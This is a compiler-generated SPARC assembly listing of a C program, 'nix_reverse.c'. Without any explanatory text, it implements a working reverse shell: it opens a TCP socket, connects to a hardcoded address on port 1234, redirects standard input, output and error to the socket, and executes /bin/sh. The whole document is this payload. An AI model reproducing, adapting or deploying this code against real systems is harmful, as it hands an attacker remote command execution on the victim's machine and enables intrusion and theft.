	.file	"nix_reverse.c"
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align 8
.LC0:
	.asciz	"/bin/sh"
	.section	.text.startup,"ax",@progbits
	.align 4
	.global main
	.type	main, #function
	.proc	04
main:
	save	%sp, -224, %sp
	sethi	%hi(16777216), %g1
	or	%g1, 127, %g1
	sethi	%hi(_GLOBAL_OFFSET_TABLE_-4), %l7
	call	__sparc_get_pc_thunk.l7
	
  add	%l7, %lo(_GLOBAL_OFFSET_TABLE_+4), %l7
	stx	%g1, [%fp+2007]
	mov	0, %o2
	mov	1, %o1
	call	socket, 0
	
  mov	2, %o0
	mov	2, %g1
	sth	%g1, [%fp+2031]
	mov	1234, %g1
	sth	%g1, [%fp+2033]
	lduw	[%fp+2007], %g1
	st	%g1, [%fp+2035]
	lduw	[%fp+2011], %g1
	mov	%o0, %i5
	st	%g1, [%fp+2039]
	mov	16, %o2
	call	connect, 0
	add	%fp, 2031, %o1
   
	mov	0, %o1
	call	dup2, 0
	
  mov	%i5, %o0
	mov	0, %i0
	mov	1, %o1
	call	dup2, 0
	
  mov	%i5, %o0
	mov	2, %o1
	call	dup2, 0
	
  mov	%i5, %o0
	stx	%g0, [%fp+2023]
	mov	0, %o2
	add	%fp, 2015, %o1
	sethi	%gdop_hix22(.LC0), %o0
	xor	%o0, %gdop_lox10(.LC0), %o0
	ldx	[%l7 + %o0], %o0, %gdop(.LC0)
	call	execve, 0
	
  stx	%o0, [%fp+2015]
	return	%i7+8
  
	 nop
	.size	main, .-main
	.ident	"GCC: (Debian 6.3.0-19) 6.3.0 20170618"
	.section	.text.__sparc_get_pc_thunk.l7,"axG",@progbits,__sparc_get_pc_thunk.l7,comdat
	.align 4
	.weak	__sparc_get_pc_thunk.l7
	.hidden	__sparc_get_pc_thunk.l7
	.type	__sparc_get_pc_thunk.l7, #function
	.proc	020
__sparc_get_pc_thunk.l7:
	jmp	%o7+8
	 add	%o7, %l7, %l7
	.section	.note.GNU-stack,"",@progbits
